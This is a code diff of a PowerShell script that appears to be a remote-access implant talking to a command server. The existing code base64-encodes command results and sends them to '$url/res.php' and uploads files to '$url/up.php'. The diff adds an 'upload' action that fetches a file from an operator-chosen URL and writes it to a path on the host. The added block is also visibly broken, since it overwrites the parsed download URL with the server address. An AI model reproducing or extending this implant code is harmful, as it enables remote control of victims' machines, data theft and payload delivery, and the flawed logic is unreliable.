@@ -94,8 +94,39 @@ $d = "$($c) $($file)"
 $EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
 $Encd = [System.Convert]::ToBase64String($EncdBytes)
 
-$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&$id")
+$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&id=$id")
 $up=(Invoke-RestMethod -Uri "$url/up.php?id=$id" -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines)
+
+
+
+}
+
+if ($act -eq "upload")
+{
+$urldl = ($cmd -split ':',5)[2,3]
+Write-Host "URL"
+Write-Host $urldl
+$urldl = ($url -join ":")
+Write-Host "URL"
+Write-Host $urldl
+	if ([string]::IsNullOrWhiteSpace($urldl))
+    {
+	
+        continue
+    }
+
+$path = ($cmd -split ':',5)[-1]
+Write-Host "PATH"
+Write-Host $path
+
+$c = "Downloading "
+$d = "$($c) $($urldl) $($path)"
+
+$EncdBytes = [System.Text.Encoding]::UTF8.GetBytes($d)
+$Encd = [System.Convert]::ToBase64String($EncdBytes)
+
+$resup=(Invoke-WebRequest "$url/res.php?res=$Encd&id=$id")
+$down= (Invoke-WebRequest -Uri $urldl -OutFile $path)
 
 
 
